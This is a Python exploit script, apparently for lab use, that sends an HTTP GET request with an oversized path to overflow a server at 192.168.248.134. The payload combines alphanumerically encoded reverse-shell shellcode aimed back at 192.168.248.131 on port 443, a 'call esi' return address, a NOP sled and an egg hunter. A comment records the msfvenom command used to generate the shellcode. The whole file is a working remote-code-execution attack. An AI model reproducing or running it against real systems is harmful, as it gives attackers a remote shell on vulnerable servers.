#!/usr/bin/python

import struct
import socket

def p32(addr):
	return struct.pack("<I",addr)

def http_send_fuzz(host,port,http_request):
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host,int(port)))
	s.send(http_request)
	s.close()



egg_hunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x50\x57\x4e\x44\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# msfvenom -a x86 --platform windows  -p windows/shell_reverse_tcp LHOST=192.168.248.131 LPORT=443 -f raw EXITFUNC=thread|~/Desktop/exp_repo/encoders/alpha2/alpha2 EDI --uppercase

# not clean exit :(

shellcode = (
'WYIIIIIIIIIIQZVTX30VX4AP0A3HH0A0'
'0ABAABTAAQ2AB2BB0BBXP8ACJJIKLM8M'
'Y5P5PS0SPMYM5P18R54LKPRP0LK0RTLL'
'K0RTTLKRRGXTOH7QZWVP1KO6QO0NLWLC'
'QCL32VL7P9QXO4MUQYWKRJP1B67LKPR4'
'PLK0BWLS1N0LKW02XK59PSDQZS1XP0PL'
'K78B8LKPX7PUQN3KS7LW9LK7DLK31N6F'
'QKOVQO0NLYQXOTMS1O77HM0T5JT333MZ'
'X7KSMQ42UKRQHLK1HQ4S1HSRFLK4LPKL'
'KF85LS1HSLKS4LKEQ8PK91TQ4WTQK1KU'
'1QIQJPQKOKPPXQOPZLKDRJKMV1MBHVSF'
'RUPEP3X3GD3P21OPTU80LRWQ6UWKOYEN'
'XLPS1UP30Q9O4F4F0U8WYMPBK5PKON5P'
'PF0V0PPG00PQPPPSXZJ4O9OKPKON5LIY'
'WCX9PNHJXLCSX32UP31OKMYKV2JTP66Q'
'GBHMINESDCQKOYERHSSRM54S0K9JCPWP'
'WQG01JVCZR2F91FM2KMSVYWW4WTGLC1C'
'1LM1T7TTPO6C0QTPT0PPV0VV6G61F0N0'
'VQFV30VSXBYXLWOK6KOIEK9KPPNQF1VK'
'O00SX38K7EMSPKO8UOKKP5MFJUZE8OVL'
'UOMMMKON57LUVSL5ZMPKKKPBU5UOK77B'
'3T2RO2JEPV3KOHUA'
)



call_esi = p32(0x73cf1551)

payload = 'PWNDPWND'+shellcode+'A'*(999-len(shellcode))+call_esi+'\x90'*(189-len(egg_hunter))+egg_hunter

buf = (
"GET %s HTTP/1.0\r\n"
"Host: 192.168.248.134\r\n"
"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1\r\n"
"Connection: close\r\n\r\n"
) %(payload)

host = "192.168.248.134"
port = 80


http_send_fuzz(host,port,buf)
